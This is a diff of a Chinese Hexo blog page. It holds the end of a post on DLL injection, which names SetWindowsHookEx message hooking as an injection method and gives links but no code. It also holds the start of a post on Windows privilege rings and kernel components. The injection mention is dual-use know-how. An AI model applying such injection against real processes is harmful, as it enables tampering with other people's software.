+<h1 id="0x02-SetWindowsHookEx"><a href="#0x02-SetWindowsHookEx" class="headerlink" title="0x02-SetWindowsHookEx()"></a>0x02-SetWindowsHookEx()</h1><p>在另一篇文章Hook写了，就不过多介绍</p>
+<p>下面是更详细的解释</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1199648?msclkid=f79c9cc7b96011ecbdb2f47296f3b9d3">https://cloud.tencent.com/developer/article/1199648?msclkid=f79c9cc7b96011ecbdb2f47296f3b9d3</a></p>
+<p>注入DLL的第三个方法就是消息钩取</p>
+<p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649658514411.png"></p>
+<h1 id="0x03-还有其他方法"><a href="#0x03-还有其他方法" class="headerlink" title="0x03-还有其他方法"></a>0x03-还有其他方法</h1><p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-253918.htm">https://bbs.pediy.com/thread-253918.htm</a></p>
+
+      
+    </div>
+
+    
+    
     
 
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
 
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://gift1a.github.io/2022/04/09/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Gift1a">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/09/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">Windows内核基础</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-04-09 19:04:09" itemprop="dateCreated datePublished" datetime="2022-04-09T19:04:09+08:00">2022-04-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-04-16 19:50:40" itemprop="dateModified" datetime="2022-04-16T19:50:40+08:00">2022-04-16</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="0x00-权限级别"><a href="#0x00-权限级别" class="headerlink" title="0x00-权限级别"></a>0x00-权限级别</h1><p>先来看一下特权级环，从里往外权限逐渐降低</p>
+<p><img src="/2022/04/09/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80/1650108857255.png" alt="特权级环"></p>
+<blockquote>
+<p><strong>系统内核层，又叫零环（Ring 0，简称“R0”；与此对应的应用层叫3环，即Ring 3，简称“R3”），实际上是CPU的4个运行级别中的一个</strong></p>
+</blockquote>
+<p>CPU设计者将CPU的运行级别从内往外分为4个，依次为R0、R1、R2、R3，运行权限从R0到R3依次降低。CPU设计制造商在设计之初是让R0运行内核，让R1、R2运行驱动设备，让R3运行应用程序的。</p>
+<p>操作系统设计者与开发商在设计操作系统（例如微软Windows和开源社区的Linus编写的Linux）的时候，为了让工作变得简单，<strong>并没有使用R1和R2两个级别，而是将设备驱动运行在与内核一个级别的R0级</strong></p>
+<p>在AMD64CPU诞生之后，CPU的设计者干脆也和操作吸引保持一致，只保留了R0和R3两个级别</p>
+<p><img src="/2022/04/09/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80/1650109580425.png" alt="Windows XP体系结构简图"></p>
+<p>HAL是一个可加载的核心模块HAL.DLL，它为运行在Windows XP上的硬件平台提供低级接口。Windows XP的执行体是NTOSKRNL.EXE的上层（内核是其下层）。用户层导出并且可以调用的函数接口在NTDLL.DLL中，通过Win32 API或其他环境子系统对它们进行访问</p>
+<p><img src="/2022/04/09/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80/1650109820013.png"></p>
+<h1 id="0x01-内存空间布局"><a href="#0x01-内存空间布局" class="headerlink" title="0x01-内存空间布局"></a>0x01-内存空间布局</h1>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Gift1a</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
 </html>
